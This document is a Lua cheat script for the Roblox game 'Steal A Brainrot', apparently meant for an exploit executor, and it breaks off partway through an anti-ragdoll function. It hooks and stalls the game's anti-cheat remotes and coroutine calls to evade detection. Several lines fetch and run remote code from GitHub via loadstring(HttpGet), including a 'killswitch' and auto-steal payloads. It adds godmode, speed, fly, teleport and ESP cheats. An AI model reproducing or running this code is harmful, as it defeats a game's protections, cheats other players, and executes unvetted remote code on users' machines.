-- This is a LocalScript intended to be placed in StarterPlayerScripts.
-- Its purpose is to move a specific ScreenGui named "ScreenGui" from CoreGui to the player's PlayerGui.

-- Get essential Roblox services and the local player.
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer

-- Check if we are running in a client environment.
if not RunService:IsClient() then
	return
end

-- Wait for the player and their PlayerGui to be fully loaded.
local playerGui = player:WaitForChild("PlayerGui")

-- Since CoreGui is a service, we can access it directly.
local coreGui = game:GetService("CoreGui")

-- Try to find the specific ScreenGui named "ScreenGui".
local guiToMove = coreGui:FindFirstChild("ScreenGui")

-- Check if the ScreenGui was found and is the correct type.
if guiToMove and guiToMove:IsA("ScreenGui") then
	-- If found, move only this specific ScreenGui.
	guiToMove.Parent = playerGui
	print("Successfully moved the specific ScreenGui named 'ScreenGui' to PlayerGui.")
else
	-- If the specific ScreenGui was not found, print a warning message.
	warn("Could not find a ScreenGui instance named 'ScreenGui' in CoreGui.")
end



if not executedfrommenu then
	game.Players.LocalPlayer:Kick("DONT BYPASS KEY SYSTEM")
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/alieegemn/killswitch/refs/heads/main/onoff.txt"))()


--Gatekeeping is for the weak
---- atrexus

local StarterGui = game:GetService("StarterGui")

local scanned = {} -- prevent infinite loops
local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
local Players = cloneref(game:GetService("Players"))
local FindFunc = loadstring(game:HttpGet("https://raw.githubusercontent.com/Awakenchan/GcViewerV2/refs/heads/main/Utility/FindFunction.lua"))()
local Class,Default = loadstring(game:HttpGet("https://raw.githubusercontent.com/Awakenchan/GcViewerV2/refs/heads/main/Utility/Data2Code%40Amity.lua"))()
getgenv().Log = getgenv().Log or function(...) print(...) end

local PlayerName = game.Players.LocalPlayer.Name

local function hookRemote(remote)
    if remote:IsA("RemoteEvent") then
        local oldFire
        oldFire = hookfunction(remote.FireServer, function(self, ...)
            local args = {...}
            if args[1] and (tostring(args[1]):lower() == "x-15" or tostring(args[1]) == "X-15") or (tostring(args[1]):lower() == "x-16" or tostring(args[1]) == "X-16") then
                return task.wait(9e9)
            end
            return oldFire(self, unpack(args))
        end)
    end
end
local function isRemote(obj)
    return typeof(obj) == "Instance" and obj:IsA("RemoteEvent")
end
local function deepScan(value)
    if scanned[value] then return end
    scanned[value] = true
    if isRemote(value) then
        if not value:IsDescendantOf(ReplicatedStorage) then
            hookRemote(value)
            local Old -- dont really need this hook but it does disable basic ac in this ac
            Old = hookfunction(getrenv().coroutine.wrap, function(...)
                if not checkcaller() then
                    print(...,getfenv(2).script)
                   return task.wait(9e9)
                end
                return Old(...)
            end)
        end
        return
    end
    if typeof(value) == "function" then
        local upvalues = getupvalues(value)
        for i, v in pairs(upvalues) do
            deepScan(v)
        end
    end
    if typeof(value) == "table" then
        for k, v in pairs(value) do
            deepScan(v)
        end
    end
end
-- ac function has constant for remote and its not parent of replicatedstorage but rather all other
for _, obj in next, getgc(true) do
    if typeof(obj) == "function" and islclosure(obj) and not isexecutorclosure(obj) then
        deepScan(obj)
    end
end


local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

local Window = Fluent:CreateWindow({
    Title = "Steal A Brainrot",
    SubTitle = "by HackManHub",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 460),
    Acrylic = false, -- The blur may be detectable, setting this to false disables blur entirely
    Theme = "Light",
    MinimizeKey = Enum.KeyCode.LeftControl -- Used when theres no MinimizeKeybind
})

--Fluent provides Lucide Icons https://lucide.dev/icons/ for the tabs, icons are optional
local Tabs = {
    Main = Window:AddTab({ Title = "Main", Icon = "gamepad-2" }),
    Steal = Window:AddTab({ Title = "Steal", Icon = "landmark" }),
    Player = Window:AddTab({ Title = "Player", Icon = "person-standing" }),
    Esp = Window:AddTab({ Title = "Esp", Icon = "gamepad-2" }),
    Buy = Window:AddTab({ Title = "Buy", Icon = "shopping-bag" }),
    Server = Window:AddTab({ Title = "Server", Icon = "server" }),
    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" }),
}
local Options = Fluent.Options



Tabs.Main:AddButton({
    Title = "Antisteal (OP)",
    Desc = "Leaves Game When Someone Enters Base",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/34wefwef/antisteal.github.io/refs/heads/main/ere.lua"))()
     end
})

local GodmodeConnection

local Toggle = Tabs.Player:AddToggle("MyToggle", {
    Title = "Godmode",
    Desc = "Makes you not die",
    Icon = "shield",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        local Player = game:GetService("Players").LocalPlayer

        if state then
            local Character = Player.Character or Player.CharacterAdded:Wait()
            local Humanoid = Character:FindFirstChildOfClass("Humanoid")

            if Humanoid then
                local Clone = Humanoid:Clone()
                Clone.Parent = Character
                Humanoid:Destroy()
                Clone.Name = "Humanoid"
                workspace.CurrentCamera.CameraSubject = Clone
            end
        else
            warn("Desativar godmode requer reset manual do personagem.")
        end
    end
})

local Toggle = Tabs.Player:AddToggle("MyToggle", {
    Title = "Max Speed Boost",
    Description = "You Need Invis Cloak & Speed Coil In your inventory!",
    Default = false,
    Callback = function(state)
        task.spawn(function()
            local Config = {
                Speed = 100,
                NormalSpeed = 34,
            }

            local function SetSpeed(Humanoid, Speed)
                if Humanoid and Humanoid:FindFirstChild("WalkSpeed") then
                    Humanoid.WalkSpeed = Speed
                end
            end

            local function HookHumanoid(Humanoid)
                task.spawn(function()
                    SetSpeed(Humanoid, Config.NormalSpeed)
                end)

                local function OnPropertyChange(Object, Property, Callback)
                    Object:GetPropertyChangedSignal(Property):Connect(function()
                        Callback(Object[Property])
                    end)
                end

                OnPropertyChange(Humanoid, "WalkSpeed", function(WalkSpeed)
                    if WalkSpeed ~= Config.Speed then
                        SetSpeed(Humanoid, Config.Speed)
                    end
                end)
            end

            local function GetHumanoid()
                return game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
            end

            local Humanoid = GetHumanoid()

            if Humanoid then
                HookHumanoid(Humanoid)
            end

            game.Players.LocalPlayer.CharacterAdded:Connect(function(Character)
                Humanoid = Character:WaitForChild("Humanoid")
                HookHumanoid(Humanoid)
            end)

            if state then
                Config.Speed = 100
                if Humanoid then
                    SetSpeed(Humanoid, Config.Speed)
                end
            else
                Config.Speed = Config.NormalSpeed
                if Humanoid then
                    SetSpeed(Humanoid, Config.NormalSpeed)
                end
            end
        end)
    end
})

local UserInputService = game:GetService("UserInputService")
local player = game.Players.LocalPlayer

local DoubleJumpActive = false
local DoubleJumpConnection = nil
local StateConnection = nil

local function enableDoubleJump()
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local canDoubleJump = true

    -- Reativa o double jump ao cair no chão
    StateConnection = humanoid.StateChanged:Connect(function(_, newState)
        if newState == Enum.HumanoidStateType.Landed then
            canDoubleJump = true
        end
    end)

    -- Ação do pulo duplo
    DoubleJumpConnection = UserInputService.JumpRequest:Connect(function()
        if humanoid.FloorMaterial ~= Enum.Material.Air then
            canDoubleJump = true
        elseif canDoubleJump then
            canDoubleJump = false
            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end)
end

local function disableDoubleJump()
    if DoubleJumpConnection then
        DoubleJumpConnection:Disconnect()
        DoubleJumpConnection = nil
    end
    if StateConnection then
        StateConnection:Disconnect()
        StateConnection = nil
    end
end


Tabs.Player:AddToggle("MyToggle", {
    Title = "Double Jump",
    Desc = "Double Jumps you",
    Icon = "mouse-pointer-click",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        print("Toggle Activated: " .. tostring(state))
        DoubleJumpActive = state

        if state then
            enableDoubleJump()
        else
            disableDoubleJump()
        end
    end
})




player.CharacterAdded:Connect(function()
    wait(1)
    if DoubleJumpActive then
        enableDoubleJump()
    end
end)


Tabs.Steal:AddButton({
        Title = "Auto Steal V5 Beta [READ DESC IF YOU GETTING KICK]",
        Description = "[MAKE SURE TO LOAD THIS BEFORE STILING SO IT DONT KICKS YOU EARLY + NO TOOL NEED]",
        Callback = function()
        getgenv().executedfromas = true
loadstring(game:HttpGet("https://raw.githubusercontent.com/hackmanhub-colab/t/refs/heads/main/stbrainrotap.txt"))()
		         getgenv().executedfromas = false
                end
    })


Tabs.Steal:AddButton({
        Title = "Fly Mode V4 Beta",
        Description = "",
        Callback = function()
--// Float GUI Steal Style with ON/OFF + Resist Toggle System
--// by KzScriptsOfc + Resist Update


local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")
local humanoid = char:WaitForChild("Humanoid")

local player = game.Players.LocalPlayer
local floatAtivo = false
local floatLoop = nil

-- GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "FLY1"
gui.ResetOnSpawn = false
gui.Parent = game.CoreGui

local main = Instance.new("Frame")
main.Name = "Main"
main.Size = UDim2.new(0, 200, 0, 100)
main.Position = UDim2.new(0.5, -100, 0.5, -50)
main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true
main.Parent = gui

local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
title.Text = "Fly Mode By HackManHub"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 16
title.Parent = main

local button = Instance.new("TextButton")
button.Name = "FloatButton"
button.Size = UDim2.new(0.8, 0, 0, 30)
button.Position = UDim2.new(0.1, 0, 0.5, -15)
button.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
button.Text = "Active Fly"
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.Font = Enum.Font.SourceSansBold
button.TextSize = 14
button.Parent = main


local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")
local humanoid = char:WaitForChild("Humanoid")

-- Helper to create BodyPosition
local function createFloat(hrp)
	local bp = Instance.new("BodyPosition")
	bp.Name = "FloatPosition"
	bp.MaxForce = Vector3.new(0, 100000, 0)
	bp.Position = hrp.Position + Vector3.new(0, 0.65, 0)
	bp.D = 1000
	bp.P = 3000
	bp.Parent = hrp
	return bp
end

-- Remove BodyPosition
local function removeFloat(hrp)
	if hrp and hrp:FindFirstChild("FloatPosition") then
		hrp.FloatPosition:Destroy()
	end
end

-- Main resist loop
local function startFloatCycle(character)
	local hrp = character:WaitForChild("HumanoidRootPart")

	floatLoop = task.spawn(function()
		while floatAtivo and character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0 do
			-- PHASE 1: Float active
			button.Text = "Put OFF"
			local bp = createFloat(hrp)
			local t = tick()
			while floatAtivo and tick() - t < 1 do -- float for 1s
				if bp and bp.Parent then
					bp.Position = hrp.Position + Vector3.new(0, 0.65, 0)
				end
				task.wait(0.05)
			end
			removeFloat(hrp)

			-- PHASE 2: Resist (float off)
			if floatAtivo then
				button.Text = "Resting..."
				task.wait(0.5) -- rest 1s
				hrp.Velocity = Vector3.new(hrp.Velocity.X, 100, hrp.Velocity.Z)
				task.wait(0.2)
			end
		end
		removeFloat(hrp)
		local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")
local humanoid = char:WaitForChild("Humanoid")
	end)
end

-- Stop loop
local function stopFloat(character)
	if floatLoop then
		task.cancel(floatLoop)
		floatLoop = nil
	end
	if character then
		local hrp = character:FindFirstChild("HumanoidRootPart")
		removeFloat(hrp)
	end
end

-- Toggle button
button.MouseButton1Click:Connect(function()
	floatAtivo = not floatAtivo

	if floatAtivo then
		button.Text = "Put OFF"
		button.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
		if player.Character then
			startFloatCycle(player.Character)
		end
	else
		button.Text = "Active Fly"
		button.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
		if player.Character then
			stopFloat(player.Character)
		end
	end
end)

-- Auto resume on respawn
player.CharacterAdded:Connect(function(char)
	task.wait(1)
	if floatAtivo then
		startFloatCycle(char)
	end
end)


        end
    })



Tabs.Steal:AddButton({
        Title = "UpWalk V2 No Bugs",
        Description = "",
        Callback = function()
-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Create Button
local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 150, 0, 50)
button.Position = UDim2.new(0.4, 0, 0.8, 0)
button.Text = "UpWalk"
button.BackgroundColor3 = Color3.fromRGB(50, 150, 250)
button.TextColor3 = Color3.new(1, 1, 1)
button.Parent = screenGui

-- Variables
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")
local humanoid = char:WaitForChild("Humanoid")

local upwalking = false

-- Function to toggle upwalk loop
local function toggleUpwalk()
	upwalking = not upwalking
	if upwalking then
		button.Text = "Stop UpWalk"

		-- Loop until stopped
		task.spawn(function()
			while upwalking do
				-- Run UpWalk for 3 seconds
				local t = tick()
				while upwalking and tick() - t < 1 do
					hrp.Velocity = Vector3.new(hrp.Velocity.X, 30, hrp.Velocity.Z)
					task.wait(0.1)
				end

				-- Stop phase (1 sec wait)
				if upwalking then
					button.Text = "Resting..."
					task.wait(1)
					button.Text = "Stop UpWalk"
				end
			end
			button.Text = "UpWalk"
		end)
	else
		button.Text = "UpWalk"
	end
end

-- Button Click
button.MouseButton1Click:Connect(toggleUpwalk)

-- Reset when character respawns
player.CharacterAdded:Connect(function(c)
	char = c
	hrp = char:WaitForChild("HumanoidRootPart")
	humanoid = char:WaitForChild("Humanoid")
end)
        end
    })


local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local infJumpEnabled = false
local lastJumpTime = 0
local COOLDOWN = 0.5
local JUMP_FORCE = 50
local JUMP_DURATION = 0.2

local function safeAirJump()
    if not infJumpEnabled then return end
    local now = os.clock()
    if now - lastJumpTime < COOLDOWN then return end
    local character = LocalPlayer.Character
    if not character then return end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoid or not rootPart then return end
    lastJumpTime = now
    if rootPart:CanSetNetworkOwnership() then
        rootPart:SetNetworkOwner(LocalPlayer)
    end
    local bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
    bodyVelocity.Velocity = Vector3.new(0, JUMP_FORCE, 0)
    bodyVelocity.Parent = rootPart
    local connection
    connection = RunService.Heartbeat:Connect(function()
        if os.clock() - lastJumpTime >= JUMP_DURATION then
            bodyVelocity:Destroy()
            if rootPart:CanSetNetworkOwnership() then
                rootPart:SetNetworkOwner(nil)
            end
            connection:Disconnect()
        end
    end)
end

local Toggle = Tabs.Player:AddToggle("MyToggle", {
    Title = "Infinite Jump V2",
    Description = "Can Jump Infinitely Without a Limit! Just Spam the Spacebar",
    Default = false,
    Callback = function(Value)
        infJumpEnabled = Value
        if Value then
            UserInputService.JumpRequest:Connect(safeAirJump)
        end
    end
})



local speedBoostEnabled = false
local speedConn = nil
local DEFAULT_SPEED = 16
local BOOSTED_SPEED = 50

local Toggle = Tabs.Player:AddToggle("MyToggle", {
    Title = "Boost Speed",
    Default = false,
    Callback = function(Value)
        speedBoostEnabled = Value
        if speedConn then
            speedConn:Disconnect()
            speedConn = nil
        end
        if Value then
            speedConn = RunService.Heartbeat:Connect(function()
                if not _G._lastSpeedBoostUpdate or (tick() - _G._lastSpeedBoostUpdate) >= 0.1 then
                    local character = LocalPlayer.Character
                    if character then
                        local humanoid = character:FindFirstChildOfClass("Humanoid")
                        local rootPart = character:FindFirstChild("HumanoidRootPart")
                        if humanoid and rootPart and humanoid.MoveDirection.Magnitude > 0 then
                            local moveDir = humanoid.MoveDirection
                            rootPart.Velocity = Vector3.new(
                                moveDir.X * BOOSTED_SPEED,
                                rootPart.Velocity.Y,
                                moveDir.Z * BOOSTED_SPEED
                            )
                        end
                    end
                    _G._lastSpeedBoostUpdate = tick()
                end
            end)
        end
    end
})


Tabs.Steal:AddButton({
    Title = "Steal Gui patched",
    Desc = "Can go to up and down in sky",
    Locked = false,
    Callback = function()
            -- Criar a GUI
            local ScreenGui = Instance.new("ScreenGui")
            ScreenGui.Name = "Kz Steal "
            ScreenGui.ResetOnSpawn = false
            ScreenGui.Parent = game.CoreGui

            local ToggleButton = Instance.new("TextButton")
            ToggleButton.Size = UDim2.new(0, 200, 0, 50)
            ToggleButton.Position = UDim2.new(0, 20, 0.5, -25)
            ToggleButton.Text = "Teleport UP: OFF"
            ToggleButton.TextColor3 = Color3.new(1, 1, 1)
            ToggleButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
            ToggleButton.BorderSizePixel = 0
            ToggleButton.Font = Enum.Font.GothamBold
            ToggleButton.TextSize = 14
            ToggleButton.Active = true
            ToggleButton.Draggable = true
            ToggleButton.Parent = ScreenGui  -- corrigido aqui!

            local UICornerBtn = Instance.new("UICorner", ToggleButton)

            -- Variáveis de controle
            local toggled = false
            local originalPosition = nil

            -- Função do toggle
            ToggleButton.MouseButton1Click:Connect(function()
                local player = game:GetService("Players").LocalPlayer
                local char = player.Character or player.CharacterAdded:Wait()
                local hrp = char:WaitForChild("HumanoidRootPart")

                if not toggled then
                    originalPosition = hrp.Position
                    hrp.CFrame = hrp.CFrame + Vector3.new(0, 200, 0)
                    ToggleButton.Text = "Teleport UP: ON"
                    toggled = true
                    wait(2)
                                        if originalPosition then
                        hrp.CFrame = CFrame.new(originalPosition)
                    else
                        hrp.CFrame = hrp.CFrame - Vector3.new(0, 200, 0)
                    end
                    ToggleButton.Text = "Teleport UP: OFF"
                    toggled = false
                else
                    if originalPosition then
                        hrp.CFrame = CFrame.new(originalPosition)
                    else
                        hrp.CFrame = hrp.CFrame - Vector3.new(0, 200, 0)
                    end
                    ToggleButton.Text = "Teleport UP: OFF"
                    toggled = false
                end
            end)
    end
})



Tabs.Steal:AddButton({
    Title = "Float normal Gui",
    Desc = "Floats you for better steal",
    Locked = false,
    Callback = function()
            --// Float GUI Suave estilo Steal a Brainrot (com ON/OFF)
            --// Criado por KzScriptsOfc 

            local player = game.Players.LocalPlayer
            local floatAtivo = false
            local floatConnection = nil

            -- GUI Setup
            local gui = Instance.new("ScreenGui")
            gui.Name = "Kz Float Ui"
            gui.ResetOnSpawn = false
            gui.Parent = game.CoreGui

            local main = Instance.new("Frame")
            main.Name = "Main"
            main.Size = UDim2.new(0, 200, 0, 100)
            main.Position = UDim2.new(0.5, -100, 0.5, -50)
            main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
            main.BorderSizePixel = 0
            main.Active = true
            main.Draggable = true
            main.Parent = gui

            local title = Instance.new("TextLabel")
            title.Name = "Title"
            title.Size = UDim2.new(1, 0, 0, 30)
            title.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
            title.Text = "Float Steal Mode"
            title.TextColor3 = Color3.fromRGB(255, 255, 255)
            title.Font = Enum.Font.SourceSansBold
            title.TextSize = 16
            title.Parent = main

            local button = Instance.new("TextButton")
            button.Name = "FloatButton"
            button.Size = UDim2.new(0.8, 0, 0, 30)
            button.Position = UDim2.new(0.1, 0, 0.5, -15)
            button.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
            button.Text = "Active Float"
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 14
            button.Parent = main

            -- Função para aplicar float
            local function applyFloat(character)
                local hrp = character:WaitForChild("HumanoidRootPart")

                -- Remover anterior
                if hrp:FindFirstChild("FloatPosition") then
                    hrp:FindFirstChild("FloatPosition"):Destroy()
                end

                local bp = Instance.new("BodyPosition")
                bp.Name = "FloatPosition"
                bp.MaxForce = Vector3.new(0, 100000, 0)
                bp.Position = hrp.Position + Vector3.new(0, 0.65, 0)
                bp.D = 1000
                bp.P = 3000
                bp.Parent = hrp

                -- Atualiza a posição sempre
                floatConnection = game:GetService("RunService").Heartbeat:Connect(function()
                    if character and hrp and bp and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0 then
                        bp.Position = hrp.Position + Vector3.new(0, 0.65, 0)
                    else
                        if floatConnection then
                            floatConnection:Disconnect()
                            floatConnection = nil
                        end
                    end
                end)
            end

            -- Função para remover float
            local function removeFloat(character)
                local hrp = character:FindFirstChild("HumanoidRootPart")
                if hrp and hrp:FindFirstChild("FloatPosition") then
                    hrp.FloatPosition:Destroy()
                end
                if floatConnection then
                    floatConnection:Disconnect()
                    floatConnection = nil
                end
            end

            -- Botão ON/OFF
            button.MouseButton1Click:Connect(function()
                floatAtivo = not floatAtivo

                if floatAtivo then
                    button.Text = "Put OFF"
                    button.BackgroundColor3 = Color3.fromRGB(255, 80, 80)

                    if player.Character then
                        applyFloat(player.Character)
                    end
                else
                    button.Text = "Active Float"
                    button.BackgroundColor3 = Color3.fromRGB(0, 170, 255)

                    if player.Character then
                        removeFloat(player.Character)
                    end
                end
            end)

            -- Float automático no respawn (se ativo)
            player.CharacterAdded:Connect(function(char)
                wait(1)
                if floatAtivo then
                    applyFloat(char)
                end
            end)
    end
})


local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local espEnabled = false
local espUpdateConn = nil

local function addHighlightToCharacter(char)
    if not char or char == LocalPlayer.Character or char:FindFirstChild("HighlightESP") then return end
    local highlight = Instance.new("Highlight")
    highlight.Name = "HighlightESP"
    highlight.FillTransparency = 0.75
    highlight.OutlineTransparency = 0.5
    highlight.FillColor = Color3.new(0, 0, 0)
    highlight.OutlineColor = Color3.new(1, 1, 1)
    highlight.Adornee = char
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.Parent = char
end

local function removeHighlightFromCharacter(char)
    local highlight = char and char:FindFirstChild("HighlightESP")
    if highlight then
        highlight:Destroy()
    end
end

local function enableESP()
    if espEnabled then return end
    espEnabled = true
    espUpdateConn = game:GetService("RunService").Heartbeat:Connect(function()
        if not espEnabled then return end
        if not _G._lastESPUpdate or (tick() - _G._lastESPUpdate) >= 0.1 then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    addHighlightToCharacter(player.Character)
                end
            end
            _G._lastESPUpdate = tick()
        end
    end)
end

local function disableESP()
    if not espEnabled then return end
    espEnabled = false
    if espUpdateConn then
        espUpdateConn:Disconnect()
        espUpdateConn = nil
    end
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            removeHighlightFromCharacter(player.Character)
        end
    end
end

local Toggle = Tabs.Esp:AddToggle("MyToggle", {
    Title = "Player ESP",
    Description = "it says...",
    Default = false,
    Callback = function(state)
        if state then
            enableESP()
        else
            disableESP()
        end
    end
})













local plotTimers_Enabled = false
local plotTimers_RenderConnection = nil
local plotTimers_OriginalProperties = {}

local function disablePlotTimers()
    plotTimers_Enabled = false
    if plotTimers_RenderConnection then
        plotTimers_RenderConnection:Disconnect()
        plotTimers_RenderConnection = nil
    end
    for label, props in pairs(plotTimers_OriginalProperties) do
        pcall(function()
            if label and label.Parent then
                local bb = label:FindFirstAncestorWhichIsA("BillboardGui")
                if bb and bb.Parent then
                    bb.Enabled = props.bb_enabled
                    bb.AlwaysOnTop = props.bb_alwaysOnTop
                    bb.Size = props.bb_size
                    bb.MaxDistance = props.bb_maxDistance
                    label.TextScaled = props.label_textScaled
                    label.TextWrapped = props.label_textWrapped
                    label.AutomaticSize = props.label_automaticSize
                    label.Size = props.label_size
                    label.TextSize = props.label_textSize
                end
            end
        end)
    end
    table.clear(plotTimers_OriginalProperties)
end

local function enablePlotTimers()
    disablePlotTimers()
    plotTimers_Enabled = true
    local camera = workspace.CurrentCamera
    local DISTANCE_THRESHOLD = 45
    local SCALE_START, SCALE_RANGE = 100, 300
    local MIN_TEXT_SIZE, MAX_TEXT_SIZE = 30, 36
    local lastUpdate = 0

    plotTimers_RenderConnection = RunService.RenderStepped:Connect(function()
        if not plotTimers_Enabled then return end
        if tick() - lastUpdate < 0.1 then return end
        lastUpdate = tick()

        for _, label in ipairs(workspace.Plots:GetDescendants()) do
            if label:IsA("TextLabel") and label.Name == "RemainingTime" then
                local bb = label:FindFirstAncestorWhichIsA("BillboardGui")
                if not bb then continue end
                local model = bb:FindFirstAncestorWhichIsA("Model")
                if not model then continue end
                local basePart = model:FindFirstChildWhichIsA("BasePart", true)
                if not basePart then continue end
                if not plotTimers_OriginalProperties[label] then
                    plotTimers_OriginalProperties[label] = {
                        bb_enabled = bb.Enabled,
                        bb_alwaysOnTop = bb.AlwaysOnTop,
                        bb_size = bb.Size,
                        bb_maxDistance = bb.MaxDistance,
                        label_textScaled = label.TextScaled,
                        label_textWrapped = label.TextWrapped,
                        label_automaticSize = label.AutomaticSize,
                        label_size = label.Size,
                        label_textSize = label.TextSize,
                    }
                end
                bb.MaxDistance = 10000
                bb.AlwaysOnTop = true
                bb.ClipsDescendants = false
                bb.Size = UDim2.new(0, 300, 0, 150)
                label.TextScaled = false
                label.TextWrapped = true
                label.ClipsDescendants = false
                label.Size = UDim2.new(1, 0, 0, 32)
                label.AutomaticSize = Enum.AutomaticSize.Y

                local distance = (camera.CFrame.Position - basePart.Position).Magnitude
                if distance > DISTANCE_THRESHOLD and basePart.Position.Y >= 0 then
                    bb.Enabled = false
                else
                    bb.Enabled = true
                    local t = math.clamp((distance - SCALE_START) / SCALE_RANGE, 0, 1)
                    local newTextSize = math.clamp(MIN_TEXT_SIZE + (MAX_TEXT_SIZE - MIN_TEXT_SIZE) * t, MIN_TEXT_SIZE, MAX_TEXT_SIZE)
                    label.TextSize = newTextSize
                    label.Size = UDim2.new(1, 0, 0, newTextSize + 6)
                end
            end
        end
    end)
end

local Toggle = Tabs.Esp:AddToggle("MyToggle", {
    Title = "Esp Base Times",
    Desc = "Esp Base Times",
    Icon = "eye",
    Type = "Checkbox",
    Default = false,
    Callback = function(state)
        if state then
            enablePlotTimers()
        else
            disablePlotTimers()
        end
    end
})



Tabs.Steal:AddButton({
    Title = "Float Forward",
    Callback = function()
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hum = char:WaitForChild("Humanoid")

-- Update humanoid reference if character respawns
player.CharacterAdded:Connect(function(c)
    char = c
    hum = char:WaitForChild("Humanoid")
end)

hum.Jump = true


local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local hrp = char:WaitForChild("HumanoidRootPart")
local hum = char:WaitForChild("Humanoid") -- added humanoid ref

local speed = 50 -- studs per second

-- Create ScreenGui and Button
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "FloatForwardGui"
screenGui.Parent = player:WaitForChild("PlayerGui")

local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 150, 0, 50)
button.Position = UDim2.new(0.5, -75, 0.8, 0)
button.BackgroundColor3 = Color3.fromRGB(30, 144, 255)
button.TextColor3 = Color3.new(1,1,1)
button.Text = "Float Forward"
button.Parent = screenGui
button.Active = true
button.Draggable = true -- make draggable

local bodypos = nil
local floating = false

local function startFloating()
    if floating then return end
    floating = true

    -- Make the character jump first
    hum.Jump = true

    bodypos = Instance.new("BodyPosition")
    bodypos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bodypos.P = 10000
    bodypos.D = 1000
    bodypos.Position = hrp.Position
    bodypos.Parent = hrp

    local startTime = tick()
    local startPos = hrp.Position

    spawn(function()
        while floating and bodypos and bodypos.Parent do
            local elapsed = tick() - startTime
            local newPos = startPos + (hrp.CFrame.LookVector * speed * elapsed)
            bodypos.Position = newPos
            task.wait(0.03)
        end
    end)

    -- Stop after 5 seconds
    delay(1, function() -- changed to 5 seconds delay
        if bodypos then
            bodypos:Destroy()
            bodypos = nil
        end
        floating = false
    end)
end

button.MouseButton1Click:Connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 100, 0)
    wait(0.5)
    startFloating()
end)

    end
})



local Toggle = Tabs.Player:AddToggle("MyToggle", {
    Title = "🕴️Anti Ragdoll",
    Description = "Anti Ragdoll (you should know what this is!)",
    Default = false,
    Callback = function(state)
        local running = false
        local antiRagdollTask

        local function WaitForChild(parent, childName)
            return parent:WaitForChild(childName)
        end

        local function OnPropertyChange(instance, property, callback)
            instance:GetPropertyChangedSignal(property):Connect(function()
                callback(instance[property])
            end)
        end

        local function ForEachChild(parent, className, callback)
            for _, descendant in ipairs(parent:GetDescendants()) do
                if descendant:IsA(className) then
                    callback(descendant)
                end
            end
        end

        local function GetSelf()
            return game:GetService("Players").LocalPlayer
        end

        local function GetCharacter()
            return GetSelf().Character
        end

        if state then
            running = true
            antiRagdollTask = task.spawn(function()
                local Config = {
                    BlacklistedHumanoidStates = {
                        Enum.HumanoidStateType.Physics,
                        Enum.HumanoidStateType.Ragdoll,
                        Enum.HumanoidStateType.Dead,
                    },
                }

                local function HookCharacter(Character)
                    local RootPart = WaitForChild(Character, "HumanoidRootPart")
                    RootPart.CanCollide = true

                    OnPropertyChange(RootPart, "CanCollide", function(CanCollide)
